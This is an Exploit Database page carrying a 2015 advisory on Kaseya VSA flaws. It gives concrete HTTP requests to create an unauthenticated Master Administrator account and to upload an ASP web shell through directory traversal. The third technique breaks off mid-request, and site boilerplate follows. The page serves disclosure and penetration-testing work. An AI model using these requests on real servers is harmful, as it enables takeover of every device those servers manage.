#### EDB-ID:

###### 38351

#### CVE:

###### [2015-6922](https://nvd.nist.gov/vuln/detail/CVE-2015-6922) [2015-6589](https://nvd.nist.gov/vuln/detail/CVE-2015-6589)

**Vulnerable App:**

```
Kaseya VSA is an IT management platform for small and medium corporates.
From its console you can control thousands of computers and mobile
devices. So that if you own the Kaseya server, you own the organisation.
With this post I'm also releasing two Metasploit modules ([E1], [E2])
and a Ruby file ([E3]) that exploit the vulnerabilities described below.

A special thanks to ZDI for assisting with the disclosure of these
vulnerabilities. The full advisory text is below, but can also be
obtained from my repo at [E4].

Disclosure: 23/09/2015 / Last updated: 28/09/2015

>> Background on the affected product:
"Kaseya VSA is an integrated IT Systems Management platform that can be
leveraged seamlessly across IT disciplines to streamline and automate
your IT services. Kaseya VSA integrates key management capabilities into
a single platform. Kaseya VSA makes your IT staff more productive, your
services more reliable, your systems more secure, and your value easier
to show."

A special thanks to ZDI for assisting with the vulnerability reporting
process.
These vulnerabilities were disclosed by ZDI under IDs ZDI-15-448 [1],
ZDI-15-449 [2] and ZDI-15-450 [3] on 23/09/2015.

>> Technical details:
#1
Vulnerability: Remote privilege escalation (add Master Administrator
account - unauthenticated)
CVE-2015-6922 / ZDI-15-448
Affected versions:
VSA Version 7.0.0.0 â?? 7.0.0.32
VSA Version 8.0.0.0 â?? 8.0.0.22
VSA Version 9.0.0.0 â?? 9.0.0.18
VSA Version 9.1.0.0 â?? 9.1.0.8

GET /LocalAuth/setAccount.aspx
Page will attempt to redirect, ignore this and obtain the "sessionVal"
value from the page which will be used in the following POST request.

POST /LocalAuth/setAccount.aspx
sessionVal=<sessionVal>&adminName=<username>&NewPassword=<password>&conf
irm=<password>&adminEmail=bla (at) bla (dot) com [email concealed]&setAccount=Create

You are now a Master Administrator and can execute code in all the
managed desktops and mobile devices.
A Metasploit module that exploits this vulnerability has been released.

#2
Vulnerability: Remote code execution via file upload with directory
traversal (unauthenticated)
CVE-2015-6922 / ZDI-15-449
Affected versions:
VSA Version 7.0.0.0 â?? 7.0.0.32
VSA Version 8.0.0.0 â?? 8.0.0.22
VSA Version 9.0.0.0 â?? 9.0.0.18
VSA Version 9.1.0.0 â?? 9.1.0.8

First we do:
GET /ConfigTab/serverfiles.asp
which will respond with a 302 redirect to /mainLogon.asp?logout=<sessionID>
Thanks for creating a valid sessionID for us, Kaseya!

POST
/ConfigTab/uploader.aspx?PathData=C%3A%5CKaseya%5CWebPages%5C&qqfile=she
ll.asp
Cookie: sessionId=<sessionID>
<... ASP shell here...>

The path needs to be correct, but Kaseya is helpful enough to let us
know when a path doesn't exist.
A Metasploit module that exploits this vulnerability has been released.

#3
Vulnerability: Remote code execution via file upload with directory
traversal (authenticated)
CVE-2015-6589 / ZDI-15-450
Affected versions:
VSA Version 7.0.0.0 â?? 7.0.0.32
VSA Version 8.0.0.0 â?? 8.0.0.22
VSA Version 9.0.0.0 â?? 9.0.0.18
VSA Version 9.1.0.0 â?? 9.1.0.8

Login to the VSA console and obtain ReferringWebWindowId from the URL
(wwid parameter).
Create a POST request as below with the ReferringWebWindowId:

POST /vsapres/web20/json.ashx HTTP/1.1
Content-Type: multipart/form-data;
boundary=---------------------------114052411119142
Content-Length: 1501

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
